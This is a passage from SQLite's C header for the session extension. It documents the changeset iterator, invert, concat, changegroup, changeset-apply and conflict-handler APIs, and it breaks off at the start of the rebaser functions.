** changes. Finally, if pOp is not NULL, then *pOp is set to one of 
** [SQLITE_INSERT], [SQLITE_DELETE] or [SQLITE_UPDATE], depending on the 
** type of change that the iterator currently points to.
**
** If no error occurs, SQLITE_OK is returned. If an error does occur, an
** SQLite error code is returned. The values of the output variables may not
** be trusted in this case.
*/
SQLITE_API int sqlite3changeset_op(
  sqlite3_changeset_iter *pIter,  /* Iterator object */
  const char **pzTab,             /* OUT: Pointer to table name */
  int *pnCol,                     /* OUT: Number of columns in table */
  int *pOp,                       /* OUT: SQLITE_INSERT, DELETE or UPDATE */
  int *pbIndirect                 /* OUT: True for an 'indirect' change */
);

/*
** CAPI3REF: Obtain The Primary Key Definition Of A Table
** METHOD: sqlite3_changeset_iter
**
** For each modified table, a changeset includes the following:
**
** <ul>
**   <li> The number of columns in the table, and
**   <li> Which of those columns make up the tables PRIMARY KEY.
** </ul>
**
** This function is used to find which columns comprise the PRIMARY KEY of
** the table modified by the change that iterator pIter currently points to.
** If successful, *pabPK is set to point to an array of nCol entries, where
** nCol is the number of columns in the table. Elements of *pabPK are set to
** 0x01 if the corresponding column is part of the tables primary key, or
** 0x00 if it is not.
**
** If argument pnCol is not NULL, then *pnCol is set to the number of columns
** in the table.
**
** If this function is called when the iterator does not point to a valid
** entry, SQLITE_MISUSE is returned and the output variables zeroed. Otherwise,
** SQLITE_OK is returned and the output variables populated as described
** above.
*/
SQLITE_API int sqlite3changeset_pk(
  sqlite3_changeset_iter *pIter,  /* Iterator object */
  unsigned char **pabPK,          /* OUT: Array of boolean - true for PK cols */
  int *pnCol                      /* OUT: Number of entries in output array */
);

/*
** CAPI3REF: Obtain old.* Values From A Changeset Iterator
** METHOD: sqlite3_changeset_iter
**
** The pIter argument passed to this function may either be an iterator
** passed to a conflict-handler by [sqlite3changeset_apply()], or an iterator
** created by [sqlite3changeset_start()]. In the latter case, the most recent
** call to [sqlite3changeset_next()] must have returned SQLITE_ROW. 
** Furthermore, it may only be called if the type of change that the iterator
** currently points to is either [SQLITE_DELETE] or [SQLITE_UPDATE]. Otherwise,
** this function returns [SQLITE_MISUSE] and sets *ppValue to NULL.
**
** Argument iVal must be greater than or equal to 0, and less than the number
** of columns in the table affected by the current change. Otherwise,
** [SQLITE_RANGE] is returned and *ppValue is set to NULL.
**
** If successful, this function sets *ppValue to point to a protected
** sqlite3_value object containing the iVal'th value from the vector of 
** original row values stored as part of the UPDATE or DELETE change and
** returns SQLITE_OK. The name of the function comes from the fact that this 
** is similar to the "old.*" columns available to update or delete triggers.
**
** If some other error occurs (e.g. an OOM condition), an SQLite error code
** is returned and *ppValue is set to NULL.
*/
SQLITE_API int sqlite3changeset_old(
  sqlite3_changeset_iter *pIter,  /* Changeset iterator */
  int iVal,                       /* Column number */
  sqlite3_value **ppValue         /* OUT: Old value (or NULL pointer) */
);

/*
** CAPI3REF: Obtain new.* Values From A Changeset Iterator
** METHOD: sqlite3_changeset_iter
**
** The pIter argument passed to this function may either be an iterator
** passed to a conflict-handler by [sqlite3changeset_apply()], or an iterator
** created by [sqlite3changeset_start()]. In the latter case, the most recent
** call to [sqlite3changeset_next()] must have returned SQLITE_ROW. 
** Furthermore, it may only be called if the type of change that the iterator
** currently points to is either [SQLITE_UPDATE] or [SQLITE_INSERT]. Otherwise,
** this function returns [SQLITE_MISUSE] and sets *ppValue to NULL.
**
** Argument iVal must be greater than or equal to 0, and less than the number
** of columns in the table affected by the current change. Otherwise,
** [SQLITE_RANGE] is returned and *ppValue is set to NULL.
**
** If successful, this function sets *ppValue to point to a protected
** sqlite3_value object containing the iVal'th value from the vector of 
** new row values stored as part of the UPDATE or INSERT change and
** returns SQLITE_OK. If the change is an UPDATE and does not include
** a new value for the requested column, *ppValue is set to NULL and 
** SQLITE_OK returned. The name of the function comes from the fact that 
** this is similar to the "new.*" columns available to update or delete 
** triggers.
**
** If some other error occurs (e.g. an OOM condition), an SQLite error code
** is returned and *ppValue is set to NULL.
*/
SQLITE_API int sqlite3changeset_new(
  sqlite3_changeset_iter *pIter,  /* Changeset iterator */
  int iVal,                       /* Column number */
  sqlite3_value **ppValue         /* OUT: New value (or NULL pointer) */
);

/*
** CAPI3REF: Obtain Conflicting Row Values From A Changeset Iterator
** METHOD: sqlite3_changeset_iter
**
** This function should only be used with iterator objects passed to a
** conflict-handler callback by [sqlite3changeset_apply()] with either
** [SQLITE_CHANGESET_DATA] or [SQLITE_CHANGESET_CONFLICT]. If this function
** is called on any other iterator, [SQLITE_MISUSE] is returned and *ppValue
** is set to NULL.
**
** Argument iVal must be greater than or equal to 0, and less than the number
** of columns in the table affected by the current change. Otherwise,
** [SQLITE_RANGE] is returned and *ppValue is set to NULL.
**
** If successful, this function sets *ppValue to point to a protected
** sqlite3_value object containing the iVal'th value from the 
** "conflicting row" associated with the current conflict-handler callback
** and returns SQLITE_OK.
**
** If some other error occurs (e.g. an OOM condition), an SQLite error code
** is returned and *ppValue is set to NULL.
*/
SQLITE_API int sqlite3changeset_conflict(
  sqlite3_changeset_iter *pIter,  /* Changeset iterator */
  int iVal,                       /* Column number */
  sqlite3_value **ppValue         /* OUT: Value from conflicting row */
);

/*
** CAPI3REF: Determine The Number Of Foreign Key Constraint Violations
** METHOD: sqlite3_changeset_iter
**
** This function may only be called with an iterator passed to an
** SQLITE_CHANGESET_FOREIGN_KEY conflict handler callback. In this case
** it sets the output variable to the total number of known foreign key
** violations in the destination database and returns SQLITE_OK.
**
** In all other cases this function returns SQLITE_MISUSE.
*/
SQLITE_API int sqlite3changeset_fk_conflicts(
  sqlite3_changeset_iter *pIter,  /* Changeset iterator */
  int *pnOut                      /* OUT: Number of FK violations */
);


/*
** CAPI3REF: Finalize A Changeset Iterator
** METHOD: sqlite3_changeset_iter
**
** This function is used to finalize an iterator allocated with
** [sqlite3changeset_start()].
**
** This function should only be called on iterators created using the
** [sqlite3changeset_start()] function. If an application calls this
** function with an iterator passed to a conflict-handler by
** [sqlite3changeset_apply()], [SQLITE_MISUSE] is immediately returned and the
** call has no effect.
**
** If an error was encountered within a call to an sqlite3changeset_xxx()
** function (for example an [SQLITE_CORRUPT] in [sqlite3changeset_next()] or an 
** [SQLITE_NOMEM] in [sqlite3changeset_new()]) then an error code corresponding
** to that error is returned by this function. Otherwise, SQLITE_OK is
** returned. This is to allow the following pattern (pseudo-code):
**
** <pre>
**   sqlite3changeset_start();
**   while( SQLITE_ROW==sqlite3changeset_next() ){
**     // Do something with change.
**   }
**   rc = sqlite3changeset_finalize();
**   if( rc!=SQLITE_OK ){
**     // An error has occurred 
**   }
** </pre>
*/
SQLITE_API int sqlite3changeset_finalize(sqlite3_changeset_iter *pIter);

/*
** CAPI3REF: Invert A Changeset
**
** This function is used to "invert" a changeset object. Applying an inverted
** changeset to a database reverses the effects of applying the uninverted
** changeset. Specifically:
**
** <ul>
**   <li> Each DELETE change is changed to an INSERT, and
**   <li> Each INSERT change is changed to a DELETE, and
**   <li> For each UPDATE change, the old.* and new.* values are exchanged.
** </ul>
**
** This function does not change the order in which changes appear within
** the changeset. It merely reverses the sense of each individual change.
**
** If successful, a pointer to a buffer containing the inverted changeset
** is stored in *ppOut, the size of the same buffer is stored in *pnOut, and
** SQLITE_OK is returned. If an error occurs, both *pnOut and *ppOut are
** zeroed and an SQLite error code returned.
**
** It is the responsibility of the caller to eventually call sqlite3_free()
** on the *ppOut pointer to free the buffer allocation following a successful 
** call to this function.
**
** WARNING/TODO: This function currently assumes that the input is a valid
** changeset. If it is not, the results are undefined.
*/
SQLITE_API int sqlite3changeset_invert(
  int nIn, const void *pIn,       /* Input changeset */
  int *pnOut, void **ppOut        /* OUT: Inverse of input */
);

/*
** CAPI3REF: Concatenate Two Changeset Objects
**
** This function is used to concatenate two changesets, A and B, into a 
** single changeset. The result is a changeset equivalent to applying
** changeset A followed by changeset B. 
**
** This function combines the two input changesets using an 
** sqlite3_changegroup object. Calling it produces similar results as the
** following code fragment:
**
** <pre>
**   sqlite3_changegroup *pGrp;
**   rc = sqlite3_changegroup_new(&pGrp);
**   if( rc==SQLITE_OK ) rc = sqlite3changegroup_add(pGrp, nA, pA);
**   if( rc==SQLITE_OK ) rc = sqlite3changegroup_add(pGrp, nB, pB);
**   if( rc==SQLITE_OK ){
**     rc = sqlite3changegroup_output(pGrp, pnOut, ppOut);
**   }else{
**     *ppOut = 0;
**     *pnOut = 0;
**   }
** </pre>
**
** Refer to the sqlite3_changegroup documentation below for details.
*/
SQLITE_API int sqlite3changeset_concat(
  int nA,                         /* Number of bytes in buffer pA */
  void *pA,                       /* Pointer to buffer containing changeset A */
  int nB,                         /* Number of bytes in buffer pB */
  void *pB,                       /* Pointer to buffer containing changeset B */
  int *pnOut,                     /* OUT: Number of bytes in output changeset */
  void **ppOut                    /* OUT: Buffer containing output changeset */
);


/*
** CAPI3REF: Changegroup Handle
**
** A changegroup is an object used to combine two or more 
** [changesets] or [patchsets]
*/
typedef struct sqlite3_changegroup sqlite3_changegroup;

/*
** CAPI3REF: Create A New Changegroup Object
** CONSTRUCTOR: sqlite3_changegroup
**
** An sqlite3_changegroup object is used to combine two or more changesets
** (or patchsets) into a single changeset (or patchset). A single changegroup
** object may combine changesets or patchsets, but not both. The output is
** always in the same format as the input.
**
** If successful, this function returns SQLITE_OK and populates (*pp) with
** a pointer to a new sqlite3_changegroup object before returning. The caller
** should eventually free the returned object using a call to 
** sqlite3changegroup_delete(). If an error occurs, an SQLite error code
** (i.e. SQLITE_NOMEM) is returned and *pp is set to NULL.
**
** The usual usage pattern for an sqlite3_changegroup object is as follows:
**
** <ul>
**   <li> It is created using a call to sqlite3changegroup_new().
**
**   <li> Zero or more changesets (or patchsets) are added to the object
**        by calling sqlite3changegroup_add().
**
**   <li> The result of combining all input changesets together is obtained 
**        by the application via a call to sqlite3changegroup_output().
**
**   <li> The object is deleted using a call to sqlite3changegroup_delete().
** </ul>
**
** Any number of calls to add() and output() may be made between the calls to
** new() and delete(), and in any order.
**
** As well as the regular sqlite3changegroup_add() and 
** sqlite3changegroup_output() functions, also available are the streaming
** versions sqlite3changegroup_add_strm() and sqlite3changegroup_output_strm().
*/
SQLITE_API int sqlite3changegroup_new(sqlite3_changegroup **pp);

/*
** CAPI3REF: Add A Changeset To A Changegroup
** METHOD: sqlite3_changegroup
**
** Add all changes within the changeset (or patchset) in buffer pData (size
** nData bytes) to the changegroup. 
**
** If the buffer contains a patchset, then all prior calls to this function
** on the same changegroup object must also have specified patchsets. Or, if
** the buffer contains a changeset, so must have the earlier calls to this
** function. Otherwise, SQLITE_ERROR is returned and no changes are added
** to the changegroup.
**
** Rows within the changeset and changegroup are identified by the values in
** their PRIMARY KEY columns. A change in the changeset is considered to
** apply to the same row as a change already present in the changegroup if
** the two rows have the same primary key.
**
** Changes to rows that do not already appear in the changegroup are
** simply copied into it. Or, if both the new changeset and the changegroup
** contain changes that apply to a single row, the final contents of the
** changegroup depends on the type of each change, as follows:
**
** <table border=1 style="margin-left:8ex;margin-right:8ex">
**   <tr><th style="white-space:pre">Existing Change  </th>
**       <th style="white-space:pre">New Change       </th>
**       <th>Output Change
**   <tr><td>INSERT <td>INSERT <td>
**       The new change is ignored. This case does not occur if the new
**       changeset was recorded immediately after the changesets already
**       added to the changegroup.
**   <tr><td>INSERT <td>UPDATE <td>
**       The INSERT change remains in the changegroup. The values in the 
**       INSERT change are modified as if the row was inserted by the
**       existing change and then updated according to the new change.
**   <tr><td>INSERT <td>DELETE <td>
**       The existing INSERT is removed from the changegroup. The DELETE is
**       not added.
**   <tr><td>UPDATE <td>INSERT <td>
**       The new change is ignored. This case does not occur if the new
**       changeset was recorded immediately after the changesets already
**       added to the changegroup.
**   <tr><td>UPDATE <td>UPDATE <td>
**       The existing UPDATE remains within the changegroup. It is amended 
**       so that the accompanying values are as if the row was updated once 
**       by the existing change and then again by the new change.
**   <tr><td>UPDATE <td>DELETE <td>
**       The existing UPDATE is replaced by the new DELETE within the
**       changegroup.
**   <tr><td>DELETE <td>INSERT <td>
**       If one or more of the column values in the row inserted by the
**       new change differ from those in the row deleted by the existing 
**       change, the existing DELETE is replaced by an UPDATE within the
**       changegroup. Otherwise, if the inserted row is exactly the same 
**       as the deleted row, the existing DELETE is simply discarded.
**   <tr><td>DELETE <td>UPDATE <td>
**       The new change is ignored. This case does not occur if the new
**       changeset was recorded immediately after the changesets already
**       added to the changegroup.
**   <tr><td>DELETE <td>DELETE <td>
**       The new change is ignored. This case does not occur if the new
**       changeset was recorded immediately after the changesets already
**       added to the changegroup.
** </table>
**
** If the new changeset contains changes to a table that is already present
** in the changegroup, then the number of columns and the position of the
** primary key columns for the table must be consistent. If this is not the
** case, this function fails with SQLITE_SCHEMA. If the input changeset
** appears to be corrupt and the corruption is detected, SQLITE_CORRUPT is
** returned. Or, if an out-of-memory condition occurs during processing, this
** function returns SQLITE_NOMEM. In all cases, if an error occurs the
** final contents of the changegroup is undefined.
**
** If no error occurs, SQLITE_OK is returned.
*/
SQLITE_API int sqlite3changegroup_add(sqlite3_changegroup*, int nData, void *pData);

/*
** CAPI3REF: Obtain A Composite Changeset From A Changegroup
** METHOD: sqlite3_changegroup
**
** Obtain a buffer containing a changeset (or patchset) representing the
** current contents of the changegroup. If the inputs to the changegroup
** were themselves changesets, the output is a changeset. Or, if the
** inputs were patchsets, the output is also a patchset.
**
** As with the output of the sqlite3session_changeset() and
** sqlite3session_patchset() functions, all changes related to a single
** table are grouped together in the output of this function. Tables appear
** in the same order as for the very first changeset added to the changegroup.
** If the second or subsequent changesets added to the changegroup contain
** changes for tables that do not appear in the first changeset, they are
** appended onto the end of the output changeset, again in the order in
** which they are first encountered.
**
** If an error occurs, an SQLite error code is returned and the output
** variables (*pnData) and (*ppData) are set to 0. Otherwise, SQLITE_OK
** is returned and the output variables are set to the size of and a 
** pointer to the output buffer, respectively. In this case it is the
** responsibility of the caller to eventually free the buffer using a
** call to sqlite3_free().
*/
SQLITE_API int sqlite3changegroup_output(
  sqlite3_changegroup*,
  int *pnData,                    /* OUT: Size of output buffer in bytes */
  void **ppData                   /* OUT: Pointer to output buffer */
);

/*
** CAPI3REF: Delete A Changegroup Object
** DESTRUCTOR: sqlite3_changegroup
*/
SQLITE_API void sqlite3changegroup_delete(sqlite3_changegroup*);

/*
** CAPI3REF: Apply A Changeset To A Database
**
** Apply a changeset or patchset to a database. These functions attempt to
** update the "main" database attached to handle db with the changes found in
** the changeset passed via the second and third arguments. 
**
** The fourth argument (xFilter) passed to these functions is the "filter
** callback". If it is not NULL, then for each table affected by at least one
** change in the changeset, the filter callback is invoked with
** the table name as the second argument, and a copy of the context pointer
** passed as the sixth argument as the first. If the "filter callback"
** returns zero, then no attempt is made to apply any changes to the table.
** Otherwise, if the return value is non-zero or the xFilter argument to
** is NULL, all changes related to the table are attempted.
**
** For each table that is not excluded by the filter callback, this function 
** tests that the target database contains a compatible table. A table is 
** considered compatible if all of the following are true:
**
** <ul>
**   <li> The table has the same name as the name recorded in the 
**        changeset, and
**   <li> The table has at least as many columns as recorded in the 
**        changeset, and
**   <li> The table has primary key columns in the same position as 
**        recorded in the changeset.
** </ul>
**
** If there is no compatible table, it is not an error, but none of the
** changes associated with the table are applied. A warning message is issued
** via the sqlite3_log() mechanism with the error code SQLITE_SCHEMA. At most
** one such warning is issued for each table in the changeset.
**
** For each change for which there is a compatible table, an attempt is made 
** to modify the table contents according to the UPDATE, INSERT or DELETE 
** change. If a change cannot be applied cleanly, the conflict handler 
** function passed as the fifth argument to sqlite3changeset_apply() may be 
** invoked. A description of exactly when the conflict handler is invoked for 
** each type of change is below.
**
** Unlike the xFilter argument, xConflict may not be passed NULL. The results
** of passing anything other than a valid function pointer as the xConflict
** argument are undefined.
**
** Each time the conflict handler function is invoked, it must return one
** of [SQLITE_CHANGESET_OMIT], [SQLITE_CHANGESET_ABORT] or 
** [SQLITE_CHANGESET_REPLACE]. SQLITE_CHANGESET_REPLACE may only be returned
** if the second argument passed to the conflict handler is either
** SQLITE_CHANGESET_DATA or SQLITE_CHANGESET_CONFLICT. If the conflict-handler
** returns an illegal value, any changes already made are rolled back and
** the call to sqlite3changeset_apply() returns SQLITE_MISUSE. Different 
** actions are taken by sqlite3changeset_apply() depending on the value
** returned by each invocation of the conflict-handler function. Refer to
** the documentation for the three 
** [SQLITE_CHANGESET_OMIT|available return values] for details.
**
** <dl>
** <dt>DELETE Changes<dd>
**   For each DELETE change, the function checks if the target database 
**   contains a row with the same primary key value (or values) as the 
**   original row values stored in the changeset. If it does, and the values 
**   stored in all non-primary key columns also match the values stored in 
**   the changeset the row is deleted from the target database.
**
**   If a row with matching primary key values is found, but one or more of
**   the non-primary key fields contains a value different from the original
**   row value stored in the changeset, the conflict-handler function is
**   invoked with [SQLITE_CHANGESET_DATA] as the second argument. If the
**   database table has more columns than are recorded in the changeset,
**   only the values of those non-primary key fields are compared against
**   the current database contents - any trailing database table columns
**   are ignored.
**
**   If no row with matching primary key values is found in the database,
**   the conflict-handler function is invoked with [SQLITE_CHANGESET_NOTFOUND]
**   passed as the second argument.
**
**   If the DELETE operation is attempted, but SQLite returns SQLITE_CONSTRAINT
**   (which can only happen if a foreign key constraint is violated), the
**   conflict-handler function is invoked with [SQLITE_CHANGESET_CONSTRAINT]
**   passed as the second argument. This includes the case where the DELETE
**   operation is attempted because an earlier call to the conflict handler
**   function returned [SQLITE_CHANGESET_REPLACE].
**
** <dt>INSERT Changes<dd>
**   For each INSERT change, an attempt is made to insert the new row into
**   the database. If the changeset row contains fewer fields than the
**   database table, the trailing fields are populated with their default
**   values.
**
**   If the attempt to insert the row fails because the database already 
**   contains a row with the same primary key values, the conflict handler
**   function is invoked with the second argument set to 
**   [SQLITE_CHANGESET_CONFLICT].
**
**   If the attempt to insert the row fails because of some other constraint
**   violation (e.g. NOT NULL or UNIQUE), the conflict handler function is 
**   invoked with the second argument set to [SQLITE_CHANGESET_CONSTRAINT].
**   This includes the case where the INSERT operation is re-attempted because 
**   an earlier call to the conflict handler function returned 
**   [SQLITE_CHANGESET_REPLACE].
**
** <dt>UPDATE Changes<dd>
**   For each UPDATE change, the function checks if the target database 
**   contains a row with the same primary key value (or values) as the 
**   original row values stored in the changeset. If it does, and the values 
**   stored in all modified non-primary key columns also match the values
**   stored in the changeset the row is updated within the target database.
**
**   If a row with matching primary key values is found, but one or more of
**   the modified non-primary key fields contains a value different from an
**   original row value stored in the changeset, the conflict-handler function
**   is invoked with [SQLITE_CHANGESET_DATA] as the second argument. Since
**   UPDATE changes only contain values for non-primary key fields that are
**   to be modified, only those fields need to match the original values to
**   avoid the SQLITE_CHANGESET_DATA conflict-handler callback.
**
**   If no row with matching primary key values is found in the database,
**   the conflict-handler function is invoked with [SQLITE_CHANGESET_NOTFOUND]
**   passed as the second argument.
**
**   If the UPDATE operation is attempted, but SQLite returns 
**   SQLITE_CONSTRAINT, the conflict-handler function is invoked with 
**   [SQLITE_CHANGESET_CONSTRAINT] passed as the second argument.
**   This includes the case where the UPDATE operation is attempted after 
**   an earlier call to the conflict handler function returned
**   [SQLITE_CHANGESET_REPLACE].  
** </dl>
**
** It is safe to execute SQL statements, including those that write to the
** table that the callback related to, from within the xConflict callback.
** This can be used to further customize the applications conflict
** resolution strategy.
**
** All changes made by these functions are enclosed in a savepoint transaction.
** If any other error (aside from a constraint failure when attempting to
** write to the target database) occurs, then the savepoint transaction is
** rolled back, restoring the target database to its original state, and an 
** SQLite error code returned.
**
** If the output parameters (ppRebase) and (pnRebase) are non-NULL and
** the input is a changeset (not a patchset), then sqlite3changeset_apply_v2()
** may set (*ppRebase) to point to a "rebase" that may be used with the 
** sqlite3_rebaser APIs buffer before returning. In this case (*pnRebase)
** is set to the size of the buffer in bytes. It is the responsibility of the
** caller to eventually free any such buffer using sqlite3_free(). The buffer
** is only allocated and populated if one or more conflicts were encountered
** while applying the patchset. See comments surrounding the sqlite3_rebaser
** APIs for further details.
**
** The behavior of sqlite3changeset_apply_v2() and its streaming equivalent
** may be modified by passing a combination of
** [SQLITE_CHANGESETAPPLY_NOSAVEPOINT | supported flags] as the 9th parameter.
**
** Note that the sqlite3changeset_apply_v2() API is still <b>experimental</b>
** and therefore subject to change.
*/
SQLITE_API int sqlite3changeset_apply(
  sqlite3 *db,                    /* Apply change to "main" db of this handle */
  int nChangeset,                 /* Size of changeset in bytes */
  void *pChangeset,               /* Changeset blob */
  int(*xFilter)(
    void *pCtx,                   /* Copy of sixth arg to _apply() */
    const char *zTab              /* Table name */
  ),
  int(*xConflict)(
    void *pCtx,                   /* Copy of sixth arg to _apply() */
    int eConflict,                /* DATA, MISSING, CONFLICT, CONSTRAINT */
    sqlite3_changeset_iter *p     /* Handle describing change and conflict */
  ),
  void *pCtx                      /* First argument passed to xConflict */
);
SQLITE_API int sqlite3changeset_apply_v2(
  sqlite3 *db,                    /* Apply change to "main" db of this handle */
  int nChangeset,                 /* Size of changeset in bytes */
  void *pChangeset,               /* Changeset blob */
  int(*xFilter)(
    void *pCtx,                   /* Copy of sixth arg to _apply() */
    const char *zTab              /* Table name */
  ),
  int(*xConflict)(
    void *pCtx,                   /* Copy of sixth arg to _apply() */
    int eConflict,                /* DATA, MISSING, CONFLICT, CONSTRAINT */
    sqlite3_changeset_iter *p     /* Handle describing change and conflict */
  ),
  void *pCtx,                     /* First argument passed to xConflict */
  void **ppRebase, int *pnRebase, /* OUT: Rebase data */
  int flags                       /* SESSION_CHANGESETAPPLY_* flags */
);

/*
** CAPI3REF: Flags for sqlite3changeset_apply_v2
**
** The following flags may passed via the 9th parameter to
** [sqlite3changeset_apply_v2] and [sqlite3changeset_apply_v2_strm]:
**
** <dl>
** <dt>SQLITE_CHANGESETAPPLY_NOSAVEPOINT <dd>
**   Usually, the sessions module encloses all operations performed by
**   a single call to apply_v2() or apply_v2_strm() in a [SAVEPOINT]. The
**   SAVEPOINT is committed if the changeset or patchset is successfully
**   applied, or rolled back if an error occurs. Specifying this flag
**   causes the sessions module to omit this savepoint. In this case, if the
**   caller has an open transaction or savepoint when apply_v2() is called, 
**   it may revert the partially applied changeset by rolling it back.
**
** <dt>SQLITE_CHANGESETAPPLY_INVERT <dd>
**   Invert the changeset before applying it. This is equivalent to inverting
**   a changeset using sqlite3changeset_invert() before applying it. It is
**   an error to specify this flag with a patchset.
*/
#define SQLITE_CHANGESETAPPLY_NOSAVEPOINT   0x0001
#define SQLITE_CHANGESETAPPLY_INVERT        0x0002

/* 
** CAPI3REF: Constants Passed To The Conflict Handler
**
** Values that may be passed as the second argument to a conflict-handler.
**
** <dl>
** <dt>SQLITE_CHANGESET_DATA<dd>
**   The conflict handler is invoked with CHANGESET_DATA as the second argument
**   when processing a DELETE or UPDATE change if a row with the required
**   PRIMARY KEY fields is present in the database, but one or more other 
**   (non primary-key) fields modified by the update do not contain the 
**   expected "before" values.
** 
**   The conflicting row, in this case, is the database row with the matching
**   primary key.
** 
** <dt>SQLITE_CHANGESET_NOTFOUND<dd>
**   The conflict handler is invoked with CHANGESET_NOTFOUND as the second
**   argument when processing a DELETE or UPDATE change if a row with the
**   required PRIMARY KEY fields is not present in the database.
** 
**   There is no conflicting row in this case. The results of invoking the
**   sqlite3changeset_conflict() API are undefined.
** 
** <dt>SQLITE_CHANGESET_CONFLICT<dd>
**   CHANGESET_CONFLICT is passed as the second argument to the conflict
**   handler while processing an INSERT change if the operation would result 
**   in duplicate primary key values.
** 
**   The conflicting row in this case is the database row with the matching
**   primary key.
**
** <dt>SQLITE_CHANGESET_FOREIGN_KEY<dd>
**   If foreign key handling is enabled, and applying a changeset leaves the
**   database in a state containing foreign key violations, the conflict 
**   handler is invoked with CHANGESET_FOREIGN_KEY as the second argument
**   exactly once before the changeset is committed. If the conflict handler
**   returns CHANGESET_OMIT, the changes, including those that caused the
**   foreign key constraint violation, are committed. Or, if it returns
**   CHANGESET_ABORT, the changeset is rolled back.
**
**   No current or conflicting row information is provided. The only function
**   it is possible to call on the supplied sqlite3_changeset_iter handle
**   is sqlite3changeset_fk_conflicts().
** 
** <dt>SQLITE_CHANGESET_CONSTRAINT<dd>
**   If any other constraint violation occurs while applying a change (i.e. 
**   a UNIQUE, CHECK or NOT NULL constraint), the conflict handler is 
**   invoked with CHANGESET_CONSTRAINT as the second argument.
** 
**   There is no conflicting row in this case. The results of invoking the
**   sqlite3changeset_conflict() API are undefined.
**
** </dl>
*/
#define SQLITE_CHANGESET_DATA        1
#define SQLITE_CHANGESET_NOTFOUND    2
#define SQLITE_CHANGESET_CONFLICT    3
#define SQLITE_CHANGESET_CONSTRAINT  4
#define SQLITE_CHANGESET_FOREIGN_KEY 5

/* 
** CAPI3REF: Constants Returned By The Conflict Handler
**
** A conflict handler callback must return one of the following three values.
**
** <dl>
** <dt>SQLITE_CHANGESET_OMIT<dd>
**   If a conflict handler returns this value no special action is taken. The
**   change that caused the conflict is not applied. The session module 
**   continues to the next change in the changeset.
**
** <dt>SQLITE_CHANGESET_REPLACE<dd>
**   This value may only be returned if the second argument to the conflict
**   handler was SQLITE_CHANGESET_DATA or SQLITE_CHANGESET_CONFLICT. If this
**   is not the case, any changes applied so far are rolled back and the 
**   call to sqlite3changeset_apply() returns SQLITE_MISUSE.
**
**   If CHANGESET_REPLACE is returned by an SQLITE_CHANGESET_DATA conflict
**   handler, then the conflicting row is either updated or deleted, depending
**   on the type of change.
**
**   If CHANGESET_REPLACE is returned by an SQLITE_CHANGESET_CONFLICT conflict
**   handler, then the conflicting row is removed from the database and a
**   second attempt to apply the change is made. If this second attempt fails,
**   the original row is restored to the database before continuing.
**
** <dt>SQLITE_CHANGESET_ABORT<dd>
**   If this value is returned, any changes applied so far are rolled back 
**   and the call to sqlite3changeset_apply() returns SQLITE_ABORT.
** </dl>
*/
#define SQLITE_CHANGESET_OMIT       0
#define SQLITE_CHANGESET_REPLACE    1
#define SQLITE_CHANGESET_ABORT      2

/* 
** CAPI3REF: Rebasing changesets
** EXPERIMENTAL
**
** Suppose there is a site hosting a database in state S0. And that
** modifications are made that move that database to state S1 and a
** changeset recorded (the "local" changeset). Then, a changeset based
** on S0 is received from another site (the "remote" changeset) and 
** applied to the database. The database is then in state 
** (S1+"remote"), where the exact state depends on any conflict
** resolution decisions (OMIT or REPLACE) made while applying "remote".
** Rebasing a changeset is to update it to take those conflict 
** resolution decisions into account, so that the same conflicts
** do not have to be resolved elsewhere in the network. 
**
** For example, if both the local and remote changesets contain an
** INSERT of the same key on "CREATE TABLE t1(a PRIMARY KEY, b)":
**
**   local:  INSERT INTO t1 VALUES(1, 'v1');
**   remote: INSERT INTO t1 VALUES(1, 'v2');
**
** and the conflict resolution is REPLACE, then the INSERT change is
** removed from the local changeset (it was overridden). Or, if the
** conflict resolution was "OMIT", then the local changeset is modified
** to instead contain:
**
**           UPDATE t1 SET b = 'v2' WHERE a=1;
**
** Changes within the local changeset are rebased as follows:
**
** <dl>
** <dt>Local INSERT<dd>
**   This may only conflict with a remote INSERT. If the conflict 
**   resolution was OMIT, then add an UPDATE change to the rebased
**   changeset. Or, if the conflict resolution was REPLACE, add
**   nothing to the rebased changeset.
**
** <dt>Local DELETE<dd>
**   This may conflict with a remote UPDATE or DELETE. In both cases the
**   only possible resolution is OMIT. If the remote operation was a
**   DELETE, then add no change to the rebased changeset. If the remote
**   operation was an UPDATE, then the old.* fields of change are updated
**   to reflect the new.* values in the UPDATE.
**
** <dt>Local UPDATE<dd>
**   This may conflict with a remote UPDATE or DELETE. If it conflicts
**   with a DELETE, and the conflict resolution was OMIT, then the update
**   is changed into an INSERT. Any undefined values in the new.* record
**   from the update change are filled in using the old.* values from
**   the conflicting DELETE. Or, if the conflict resolution was REPLACE,
**   the UPDATE change is simply omitted from the rebased changeset.
**
**   If conflict is with a remote UPDATE and the resolution is OMIT, then
**   the old.* values are rebased using the new.* values in the remote
**   change. Or, if the resolution is REPLACE, then the change is copied
**   into the rebased changeset with updates to columns also updated by
**   the conflicting remote UPDATE removed. If this means no columns would 
**   be updated, the change is omitted.
** </dl>
**
** A local change may be rebased against multiple remote changes 
** simultaneously. If a single key is modified by multiple remote 
** changesets, they are combined as follows before the local changeset
** is rebased:
**
** <ul>
**    <li> If there has been one or more REPLACE resolutions on a
**         key, it is rebased according to a REPLACE.
**
**    <li> If there have been no REPLACE resolutions on a key, then
**         the local changeset is rebased according to the most recent
**         of the OMIT resolutions.
** </ul>
**
** Note that conflict resolutions from multiple remote changesets are 
** combined on a per-field basis, not per-row. This means that in the 
** case of multiple remote UPDATE operations, some fields of a single 
** local change may be rebased for REPLACE while others are rebased for 
** OMIT.
**
** In order to rebase a local changeset, the remote changeset must first
** be applied to the local database using sqlite3changeset_apply_v2() and
** the buffer of rebase information captured. Then:
**
** <ol>
**   <li> An sqlite3_rebaser object is created by calling 
**        sqlite3rebaser_create().
**   <li> The new object is configured with the rebase buffer obtained from
**        sqlite3changeset_apply_v2() by calling sqlite3rebaser_configure().
**        If the local changeset is to be rebased against multiple remote
**        changesets, then sqlite3rebaser_configure() should be called
**        multiple times, in the same order that the multiple
**        sqlite3changeset_apply_v2() calls were made.
**   <li> Each local changeset is rebased by calling sqlite3rebaser_rebase().
**   <li> The sqlite3_rebaser object is deleted by calling
**        sqlite3rebaser_delete().
** </ol>
*/
typedef struct sqlite3_rebaser sqlite3_rebaser;

/*
** CAPI3REF: Create a changeset rebaser object.
** EXPERIMENTAL
**
** Allocate a new changeset rebaser object. If successful, set (*ppNew) to
** point to the new object and return SQLITE_OK. Otherwise, if an error
** occurs, return an SQLite error code (e.g. SQLITE_NOMEM) and set (*ppNew) 
** to NULL. 
*/
SQLITE_API int sqlite3rebaser_create(sqlite3_rebaser **ppNew);

/*
** CAPI3REF: Configure a changeset rebaser object.
** EXPERIMENTAL
**
